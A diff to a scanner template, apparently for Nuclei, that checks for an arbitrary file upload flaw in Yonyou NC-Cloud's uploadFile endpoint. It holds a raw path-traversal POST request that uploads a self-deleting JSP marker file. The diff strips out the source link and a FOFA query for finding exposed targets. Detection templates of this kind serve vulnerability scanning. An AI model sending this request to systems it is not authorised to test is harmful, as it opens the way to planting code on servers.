@@ -3,12 +3,8 @@ info:
   name: 用友uploadFile 接口 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/upo5ziqdlkdzwuo4'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: upo5ziqdlkdzwuo4
-    fofa: app="用友-NC-Cloud"
 http:
 - raw:
   - 'POST /mp/login/../uploadControl/uploadFile HTTP/1.1
@@ -26,8 +22,6 @@ http:
     Accept-Encoding: gzip, deflate
 
 
-
-
     ------WebKitFormBoundaryoDIsCqVMmF83ptmp
 
 
@@ -37,8 +31,6 @@ http:
     Content-Type: application/octet-stream
 
 
-
-
     <%out.println("dudesite");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
 
 
@@ -46,8 +38,6 @@ http:
 
 
     Content-Disposition: form-data; name="submit"
-
-
 
 
     submit
